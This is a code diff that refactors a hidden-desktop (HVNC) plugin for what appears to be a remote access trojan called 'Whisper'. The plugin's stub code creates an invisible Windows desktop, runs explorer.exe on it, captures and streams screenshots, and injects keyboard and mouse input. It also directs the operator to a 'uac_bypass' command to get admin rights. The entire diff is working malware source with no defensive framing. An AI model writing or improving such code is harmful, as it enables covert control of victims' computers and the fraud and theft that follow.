@@ -1,39 +1,45 @@
 PLUGIN = {"name": "hvnc", "desc": "Hidden desktop (HVNC) with mouse/keyboard control & real-time streaming", "deps": [], "size": 6.0}
 
 STUB_CODE = r"""
-_hvnc_name = "Whisper_HVNC_" + str(os.getpid())
-_hvnc_desk = None
-_hvnc_run = [False]
+_hvnc_state = {"desk": None, "run": False, "proc": None, "name": None}
 _HVNC_ACCESS_MASKS = [0x01FF, 0x1000, 0x0100]
 
 def _hvnc_create():
     import ctypes
     u32 = ctypes.windll.user32
     for mask in _HVNC_ACCESS_MASKS:
-        desk = u32.CreateDesktopW(_hvnc_name, None, None, 0, mask, None)
+        desk = u32.CreateDesktopW(_hvnc_state["name"], None, None, 0, mask, None)
         if desk: return desk
     return None
 
 def _hvnc_thread():
-    global _hvnc_desk
     import ctypes
     u32 = ctypes.windll.user32
     desk = _hvnc_create()
     if not desk:
-        _hvnc_desk = None; _hvnc_run[0] = False; return
-    _hvnc_desk = desk; _hvnc_run[0] = True
+        _hvnc_state["desk"] = None; _hvnc_state["run"] = False; return
+    _hvnc_state["desk"] = desk; _hvnc_state["run"] = True
     try:
         si = subprocess.STARTUPINFO()
-        si.lpDesktop = _hvnc_name
-        subprocess.Popen(["explorer.exe"], startupinfo=si, close_fds=True)
-        while _hvnc_run[0] and desk:
+        si.lpDesktop = _hvnc_state["name"]
+        proc = subprocess.Popen(["explorer.exe"], startupinfo=si, close_fds=True)
+        _hvnc_state["proc"] = proc
+        while _hvnc_state["run"] and desk:
             time.sleep(2)
     finally:
+        if _hvnc_state["proc"]:
+            try:
+                _hvnc_state["proc"].kill()
+                _hvnc_state["proc"].wait(timeout=5)
+            except:
+                pass
+            _hvnc_state["proc"] = None
         if desk: u32.CloseDesktop(desk)
-        _hvnc_desk = None; _hvnc_run[0] = False
+        _hvnc_state["desk"] = None; _hvnc_state["run"] = False
 
 def _cmd_hvnc_start(m):
-    if _hvnc_run[0]: return {"output": "[!] HVNC already running"}
+    if _hvnc_state["run"]: return {"output": "[!] HVNC already running"}
+    _hvnc_state["name"] = "Whisper_HVNC_" + str(os.getpid())
     import ctypes
     k32 = ctypes.windll.kernel32
     u32 = ctypes.windll.user32
@@ -43,11 +49,11 @@ def _cmd_hvnc_start(m):
         return {"output": "[!] HVNC requires admin. Use uac_bypass command first to spawn an elevated agent, then use HVNC on that new client."}
     threading.Thread(target=_hvnc_thread, daemon=True).start()
     for _ in range(10):
-        if _hvnc_desk: break
+        if _hvnc_state["desk"]: break
         time.sleep(0.1)
-    if _hvnc_desk:
+    if _hvnc_state["desk"]:
         k32.SetThreadExecutionState(0x80000003)
-        return {"output": f"[+] HVNC started on desktop '{_hvnc_name}'"}
+        return {"output": f"[+] HVNC started on desktop '{_hvnc_state['name']}'"}
     err = k32.GetLastError()
     return {"output": f"[!] HVNC failed (error {err}). Need interactive RDP/console session - not service/headless server."}
 
@@ -72,7 +78,7 @@ def _cmd_hvnc_diag(m):
     return {"output": "[+] HVNC diag:\n  " + "\n  ".join(lines)}
 
 def _cmd_hvnc_stop(m):
-    _hvnc_run[0] = False; return {"output": "[+] HVNC stopped"}
+    _hvnc_state["run"] = False; return {"output": "[+] HVNC stopped"}
 
 def _ss_gdi(desk_handle=None):
     try:
@@ -106,20 +112,22 @@ def _ss_gdi(desk_handle=None):
 
 def _cmd_hvnc_screenshot(m):
     try:
-        if not _hvnc_desk: return {"output": "[!] HVNC not running"}
-        bmp = _ss_gdi(_hvnc_desk)
+        desk = _hvnc_state["desk"]
+        if not desk: return {"output": "[!] HVNC not running"}
+        bmp = _ss_gdi(desk)
         if bmp: return {"data": base64.b64encode(bmp).decode()}
         return {"output": "[!] HVNC screenshot failed"}
     except Exception as e: return {"output": f"[!] HVNC screenshot: {e}"}
 
 def _cmd_hvnc_stream(m):
     try:
-        if not _hvnc_desk: return {"output": "[!] HVNC not running"}
+        desk = _hvnc_state["desk"]
+        if not desk: return {"output": "[!] HVNC not running"}
         count = min(m.get("count", 5), 20)
         delay = max(min(m.get("delay", 1), 5), 0.5)
         images = []
         for i in range(count):
-            bmp = _ss_gdi(_hvnc_desk)
+            bmp = _ss_gdi(desk)
             if bmp: images.append(base64.b64encode(bmp).decode())
             time.sleep(delay)
         return {"data": images, "count": len(images)} if images else {"output": "[!] HVNC stream failed"}
@@ -129,9 +137,10 @@ def _hvnc_send_input(input_type, flags, data, extra=0):
     try:
         import ctypes
         u32 = ctypes.windll.user32
-        if not _hvnc_desk: return False
+        desk = _hvnc_state["desk"]
+        if not desk: return False
         cur = u32.OpenInputDesktop(0, False, 0x0100)
-        if not u32.SwitchDesktop(_hvnc_desk):
+        if not u32.SwitchDesktop(desk):
             if cur: u32.CloseDesktop(cur)
             return False
         ctypes.windll.kernel32.Sleep(50)
